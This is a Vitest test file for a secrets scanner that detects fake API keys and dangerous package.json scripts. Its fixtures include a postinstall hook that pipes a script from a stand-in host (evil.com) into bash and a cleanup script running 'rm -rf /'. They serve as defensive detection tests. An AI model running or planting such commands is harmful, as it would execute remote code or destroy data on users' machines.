import { describe, expect, it } from "vitest";
import { scanSecrets, maskSecret } from "../src/detectors/secrets.js";
import { checkSecurity } from "../src/checks/security.js";
import { makeFixture, removeFixture } from "./helpers/fixtures.js";

describe("Secrets & Security Detector", () => {
  it("masks secrets safely", () => {
    expect(maskSecret("short")).toBe("****");
    expect(maskSecret("AKIAIOSFODNN7EXAMPLE")).toBe("AKIA****PLE");
    expect(maskSecret("sk-1234567890abcdef1234567890")).toBe("sk-1****890");
  });

  it("detects AWS keys and OpenAI keys in source files", async () => {
    const fixture = await makeFixture({
      "src/index.ts": `
        const awsKey = "AKIAIOSFODNN7EXAMPLE";
        const openAi = "sk-1234567890abcdef1234567890";
      `,
    });

    try {
      const scan = await scanSecrets(fixture, null);
      expect(scan.secretFindings.length).toBe(2);

      const awsFinding = scan.secretFindings.find((f) => f.ruleId === "secret.aws-key");
      expect(awsFinding).toBeDefined();
      expect(awsFinding?.severity).toBe("critical");
      expect(awsFinding?.line).toBe(2);

      const openAiFinding = scan.secretFindings.find((f) => f.ruleId === "secret.openai-key");
      expect(openAiFinding).toBeDefined();
      expect(openAiFinding?.severity).toBe("critical");

      const diagnostics = checkSecurity(scan);
      expect(diagnostics.some((d) => d.severity === "critical")).toBe(true);
    } finally {
      await removeFixture(fixture);
    }
  });

  it("detects dangerous scripts in package.json", async () => {
    const fixture = await makeFixture({
      "src/clean.ts": "export const ok = true;",
    });

    try {
      const pkg = {
        name: "test-pkg",
        scripts: {
          postinstall: "curl https://evil.com/setup.sh | bash",
          cleanup: "rm -rf /",
        },
      };

      const scan = await scanSecrets(fixture, pkg);
      expect(scan.dangerousScripts.length).toBe(2);

      const curlScript = scan.dangerousScripts.find((s) => s.scriptName === "postinstall");
      expect(curlScript).toBeDefined();
      expect(curlScript?.severity).toBe("critical");

      const rmScript = scan.dangerousScripts.find((s) => s.scriptName === "cleanup");
      expect(rmScript).toBeDefined();
      expect(rmScript?.severity).toBe("critical");

      const diagnostics = checkSecurity(scan);
      expect(diagnostics.some((d) => d.id.includes("dangerous-script"))).toBe(true);
    } finally {
      await removeFixture(fixture);
    }
  });

  it("returns success diagnostic when codebase is clean", async () => {
    const fixture = await makeFixture({
      "src/app.ts": "export const add = (a: number, b: number) => a + b;",
    });

    try {
      const scan = await scanSecrets(fixture, { scripts: { build: "tsc" } });
      expect(scan.secretFindings.length).toBe(0);
      expect(scan.dangerousScripts.length).toBe(0);

      const diagnostics = checkSecurity(scan);
      expect(diagnostics.length).toBe(1);
      expect(diagnostics[0]?.severity).toBe("success");
      expect(diagnostics[0]?.id).toBe("security.clean");
    } finally {
      await removeFixture(fixture);
    }
  });

  it("detects Google Gemini, HuggingFace, and Telegram tokens", async () => {
    const fixture = await makeFixture({
      "src/ai.ts": `
        const geminiKey = "AIzaSyAbc123Def456Ghi789Jkl012Mno345Pq";
        const hfToken = "hf_abcdefghijklmnopqrstuvwxyz01234567";
        const tgBot = "123456789:ABCdefGHIjklMNOpqrsTUVwxyz123456789";
      `,
    });

    try {
      const scan = await scanSecrets(fixture, null);
      expect(scan.secretFindings.length).toBe(3);

      const gemini = scan.secretFindings.find((f) => f.ruleId === "secret.google-ai");
      expect(gemini).toBeDefined();

      const hf = scan.secretFindings.find((f) => f.ruleId === "secret.huggingface-token");
      expect(hf).toBeDefined();

      const tg = scan.secretFindings.find((f) => f.ruleId === "secret.telegram-token");
      expect(tg).toBeDefined();
    } finally {
      await removeFixture(fixture);
    }
  });
});
